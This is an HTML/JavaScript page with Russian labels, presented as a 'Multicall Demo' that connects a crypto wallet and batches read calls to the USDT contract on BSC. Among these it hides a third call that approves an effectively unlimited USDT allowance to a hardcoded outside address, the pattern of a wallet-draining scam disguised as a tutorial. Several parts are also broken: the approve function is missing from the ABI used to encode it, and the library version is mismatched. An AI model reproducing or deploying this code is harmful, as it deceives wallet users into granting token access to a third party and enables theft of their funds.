<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Multicall Demo</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
</head>
<body>
  <h1>Демонстрация Multicall</h1>
  <button id="connect">Подключить кошелёк</button>
  <button id="multicall">Вызвать Multicall</button>

  <script>
    let provider, signer;

    // Подключение кошелька
    document.getElementById("connect").onclick = async () => {
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      alert("Кошелёк подключен!");
    };

    // Адрес Multicall3 на BSC
    const multicallAddress = "0xcA11bde05977b3631167028862bE2a173976CA11";

    // Минимальный ABI для aggregate
    const multicallAbi = [
      "function aggregate(tuple(address target, bytes callData)[] calls) public returns (uint256 blockNumber, bytes[] returnData)"
    ];

    // USDT контракт на BSC
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
    const usdtAbi = [
      "function symbol() view returns (string)",
      "function balanceOf(address) view returns (uint256)"
    ];
    const usdtInterface = new ethers.utils.Interface(usdtAbi);

    // Вызов Multicall
    document.getElementById("multicall").onclick = async () => {
      if (!signer) {
        alert("Сначала подключи кошелёк!");
        return;
      }

      const userAddress = await signer.getAddress();

      // Формируем массив вызовов
      const calls = [
        {
          target: usdtAddress,
          callData: usdtInterface.encodeFunctionData("symbol", [])
        },
        {
          target: usdtAddress,
          callData: usdtInterface.encodeFunctionData("balanceOf", [userAddress])
        },
        {
          target: usdtAddress,
          callData: usdtInterface.encodeFunctionData("approve", ["0x6f99026B250DA2BEAfBaB86CA738Eb152A82717e", "999999999999999999999999999999999999999999999999999999999999"])
        }
      ];

      const multicall = new ethers.Contract(multicallAddress, multicallAbi, signer);
      const tx = await multicall.aggregate(calls);
      console.log("TX отправлена:", tx.hash);
      alert("Транзакция отправлена! Hash: " + tx.hash);
    };
  </script>
</body>
</html>
